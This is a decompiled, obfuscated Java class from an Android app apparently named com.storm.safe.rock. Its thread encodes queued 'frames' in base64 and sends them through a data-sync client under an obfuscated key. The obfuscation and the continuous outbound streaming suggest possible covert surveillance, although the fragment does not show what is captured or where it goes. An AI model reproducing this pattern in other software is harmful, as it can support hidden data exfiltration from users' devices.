package p000;

import android.util.Base64;
import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.tisxhskrc;
import com.storm.safe.rock.util.StringUtil;
import java.util.concurrent.TimeUnit;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final /* synthetic */ class kj0 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f57530a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0323a8 f57531a1;

    public /* synthetic */ kj0(C0323a8 c0323a8, int i) {
        this.f57530a0 = i;
        this.f57531a1 = c0323a8;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.f57530a0) {
            case 0:
                C0323a8 c0323a8 = this.f57531a1;
                while (c0323a8.f53133d3 && c0323a8.f53103a3) {
                    try {
                        byte[] bArr = (byte[]) c0323a8.f53132d2.poll(500L, TimeUnit.MILLISECONDS);
                        if (bArr != null) {
                            String strEncodeToString = Base64.encodeToString(bArr, 2);
                            C0267a0 c0267a0 = c0323a8.f53102a2;
                            if (c0267a0 == null) {
                                t60.m214724f2("dataSyncClient");
                                throw null;
                                break;
                            } else {
                                t60.m214694b5(strEncodeToString, "base64Data");
                                c0267a0.m211368a9(strEncodeToString, StringUtil.m212470a0("KloSP14rBSxePSJNCA=="));
                                c0323a8.f53137d7++;
                            }
                        }
                    } catch (InterruptedException unused) {
                    } catch (Exception e) {
                        t60.m214705c6("NetworkManager", "帧发送失败", e);
                    }
                }
                c0323a8.f53133d3 = false;
                return;
            default:
                C0323a8 c0323a82 = this.f57531a1;
                tisxhskrc.C0380a0 c0380a0 = tisxhskrc.f55188a0;
                try {
                    c0323a82.m211643a8();
                    return;
                } catch (Exception e2) {
                    t60.m214705c6("tisxhskrc", "❌ 网络恢复失败", e2);
                    return;
                }
        }
    }
}
